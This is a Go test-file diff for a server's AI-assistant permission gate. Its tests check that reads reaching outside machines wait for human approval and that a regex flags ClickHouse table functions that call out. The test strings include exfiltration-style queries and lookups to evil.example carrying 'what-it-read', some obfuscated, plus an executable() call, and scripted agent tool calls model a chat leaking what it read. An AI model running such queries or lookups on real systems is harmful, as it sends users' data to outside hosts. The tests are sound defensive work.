@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"regexp"
 	"strings"
 	"testing"
@@ -312,6 +313,104 @@ func TestAChangeWaitsForThePersonAndThenRunsThroughItsRoute(t *testing.T) {
 	}
 	if actor != "assistant" || username != "operator" || key != "" {
 		t.Fatalf("the audit entry says it was %q by %q (key %q)", actor, username, key)
+	}
+}
+
+// A read that is sent to another machine waits for the person in the default
+// mode. A name looked up is a message to whoever answers for it, and a
+// connection carries what it is told to, so these are the way out for whatever
+// a chat has read; a read that stays on the server runs as before.
+func TestAReadThatReachesAnotherMachineWaits(t *testing.T) {
+	f := operatorRouterAs(t, auth.RoleAdmin)
+	suggest := ""
+	for _, op := range f.s.agentCatalogue().ops {
+		if op.Method == http.MethodGet && op.Pattern == "/deploy/hostname" {
+			suggest = op.Tool.Name
+		}
+	}
+	if suggest == "" {
+		t.Fatal("no operation asks about a hostname")
+	}
+	const name = "what-it-read.evil.example"
+	reach := func(method, path string, query, body map[string]any) [2]any {
+		in := map[string]any{"method": method, "path": path, "reason": "Checking."}
+		if query != nil {
+			in["query"] = query
+		}
+		if body != nil {
+			in["body"] = body
+		}
+		return [2]any{assistant.ToolAPIRequest, in}
+	}
+	f.provider.queue(claudeCalls("Checking.",
+		reach("GET", "/certificates/scan", map[string]any{"domain": name}, nil),
+		reach("GET", "/certificates/dns", map[string]any{"domain": name}, nil),
+		reach("GET", "/deploy/hostname", map[string]any{"hostname": name}, nil),
+		reach("POST", "/network/dns/lookup", nil, map[string]any{"name": name}),
+		reach("POST", "/databases/test", nil, map[string]any{"driver": "postgres", "dsn": "postgres://u:p@" + name + "/db"}),
+		[2]any{assistant.ToolCallOperation, map[string]any{"name": suggest, "reason": "Checking.", "arguments": map[string]any{"hostname": name}}},
+		[2]any{assistant.ToolRecentRuns, map[string]any{"limit": 1}},
+	))
+	events := f.ask(t, `{"question":"Is it reachable?","mode":"changes"}`)
+	pending, _ := doneOf(t, events)["pending"].([]any)
+	if len(pending) != 6 {
+		t.Fatalf("%d of the six waited: %v", len(pending), pending)
+	}
+	for _, held := range pending {
+		if call := held.(map[string]any); call["kind"] != "read" {
+			t.Errorf("held as %v, not as the read it is: %v", call["kind"], call)
+		}
+	}
+	if called := ofType(events, "called"); len(called) != 1 || called[0]["tool"] != assistant.ToolRecentRuns || called[0]["ok"] != true {
+		t.Fatalf("a read that stays on the server did not run on its own: %v", called)
+	}
+	// A name suggested for a deployment is under the server's own domain, and a
+	// read is only held when its mode holds reads or it reaches out.
+	if agentReaches("GET", "/deploy/hostname", url.Values{"name": {"shop"}}) || agentReaches("GET", "/deploy/", nil) {
+		t.Error("a read that names no machine waits")
+	}
+	// The source of an import is another server's address, read by connecting to it.
+	if !agentReaches("POST", "/databases/{id}/imports/inspect", nil) {
+		t.Error("inspecting an import's source, at an address of the call's choosing, does not wait")
+	}
+	server := &agentScope{kind: agentScopeServer}
+	reaching := agentCallView{Kind: agentKindRead, asks: true}
+	if !agentHolds(server, assistant.ModeChanges, reaching) || !agentHolds(server, assistant.ModeAsk, reaching) ||
+		agentHolds(server, assistant.ModeFull, reaching) || agentHolds(server, assistant.ModeChanges, agentCallView{Kind: agentKindRead}) {
+		t.Error("a reaching read waits in every mode but full access, and a plain one only when every read does")
+	}
+	// The model is told which reads will wait, where it looks routes up.
+	if found := f.s.apiCatalogue().findRoutes(assistant.FindInput{Query: "certificates scan"}); !strings.Contains(found.text,
+		"GET /certificates/scan: ") || !strings.Contains(found.text, "[read, asked first: it reaches another machine]") {
+		t.Errorf("find_routes does not say a scan is asked first: %s", found.text)
+	}
+	// A draft's own reads never wait, but one that reaches out does.
+	draft := &agentScope{kind: agentScopeDraft}
+	if !agentHolds(draft, assistant.ModeChanges, agentCallView{Kind: agentKindRead, asks: true, draftOwn: true}) {
+		t.Error("a draft's chat looked a name of its choosing up without asking")
+	}
+}
+
+// A ClickHouse SELECT from a table function that reads another machine is sent
+// there by the database's server: it is not a read that runs unasked.
+func TestAClickHouseSelectFromAnotherMachineIsNotAPlainRead(t *testing.T) {
+	for query, reaches := range map[string]bool{
+		"SELECT * FROM url('http://evil.example/x?d=what-it-read', CSV, 'a String')": true,
+		"select * from remote('evil.example:9000', system.one)":                      true,
+		"SELECT * FROM s3 ('http://evil.example/b/k', 'CSV')":                        true,
+		"SELECT * FROM mysql('evil.example:3306', 'db', 't', 'u', 'p')":              true,
+		"SELECT * FROM executable('x.sh', TabSeparated, 'a String')":                 true,
+		"SELECT * FROM url/* */('http://evil.example/what-it-read', CSV)":            true,
+		"SELECT * FROM `url`('http://evil.example/what-it-read', CSV)":               true,
+		"SELECT * FROM url -- a name\n('http://evil.example/what-it-read', CSV)":     true,
+		"SELECT * FROM oss('http://evil.example/b/k', 'CSV')":                        true,
+		"SELECT url, count() FROM hits GROUP BY url":                                 false,
+		"SELECT domain(url) AS d, protocol(url) FROM hits WHERE remote_addr != ''":   false,
+		"SELECT * FROM system.clusters":                                              false,
+	} {
+		if got := clickHouseReaching.MatchString(query); got != reaches {
+			t.Errorf("%q reaches = %v, want %v", query, got, reaches)
+		}
 	}
 }
 
@@ -686,6 +785,15 @@ func TestTheCatalogueIsTheRoutesItSaysItIs(t *testing.T) {
 	for route := range agentReadingPosts {
 		if !routes[route] {
 			t.Errorf("agentReadingPosts names %s, which the router does not have", route)
+		}
+	}
+	for route := range agentReachingReads {
+		method, _, _ := strings.Cut(route, " ")
+		switch {
+		case !routes[route]:
+			t.Errorf("agentReachingReads names %s, which the router does not have", route)
+		case method != http.MethodGet && !agentReadingPosts[route]:
+			t.Errorf("agentReachingReads names %s, which is not a read: a change waits already", route)
 		}
 	}
 	for handler := range agentStreamHandlers {
